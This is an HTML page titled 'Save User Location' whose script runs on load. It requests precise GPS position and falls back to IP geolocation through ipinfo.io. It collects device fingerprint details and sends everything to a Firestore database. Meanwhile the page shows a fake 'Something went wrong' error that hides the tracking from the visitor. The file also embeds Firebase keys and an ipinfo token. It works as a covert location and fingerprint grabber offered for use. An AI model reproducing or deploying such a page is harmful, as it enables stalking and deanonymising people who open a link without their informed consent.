<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Save User Location</title>
    <script type="module">
        // Import Firebase v9+ (Modular)
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // Firebase Configuration
		  const firebaseConfig = {
			apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
			authDomain: "locationsaver-b9997.firebaseapp.com",
			projectId: "locationsaver-b9997",
			storageBucket: "locationsaver-b9997.firebasestorage.app",
			messagingSenderId: "675975845355",
			appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
			measurementId: "G-WJJY3Q2M8E"
		  };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);


        // Function to get device & browser info
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                deviceMemory: navigator.deviceMemory || "Unknown", // RAM in GB
                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown", // CPU Cores
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                onlineStatus: navigator.onLine,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                pageURL: window.location.href
            };
        }
		

        // Function to get GPS location (if user allows)
        function getGPSLocation(callback) {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        callback({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            type: "GPS" // Indicating GPS-based location
                        });
                    },
                    (error) => {
                        console.warn("❌ GPS denied, using IP location instead.");
                        callback(null); // Fallback to IP-based location
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                console.warn("❌ GPS not supported.");
                callback(null);
            }
        }


        // Fetch IP-based location data
        function getIPLocation(callback) {
            fetch('https://ipinfo.io/json?token=6a9008bb55fd89')
                .then(response => response.json())
                .then(data => {
                    const location = {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        location: data.loc.split(","), // Convert "lat,lon" to [lat, lon]
                        org: data.org,
                        postal: data.postal || "Unknown",
                        timezone: data.timezone || "Unknown",
                        type: "IP" // Indicating IP-based location
                    };
                    callback(location);
                })
                .catch(error => {
                    console.error("❌ Error fetching IP location:", error);
                    callback(null);
                });
        }

        // Get user location (GPS first, fallback to IP)
        getGPSLocation((gpsLocation) => {
            if (gpsLocation) {
                saveUserData(gpsLocation);
            } else {
                getIPLocation((ipLocation) => saveUserData(ipLocation));
            }
        });

        // Save user data to Firestore
        async function saveUserData(location) {
            const userInfo = {
                location: location || "Unknown",
                device: getDeviceInfo(),
                timestamp: new Date()
            };

            try {
                await addDoc(collection(db, "user_data"), userInfo);
                console.log("✅ User data saved:", userInfo);
            } catch (error) {
                console.error("❌ Error saving user data:", error);
            }
        }
    </script>
</head>
<body>
    <h2>Something went wrong, Please refresh the page.....</h2>
</body>
</html>
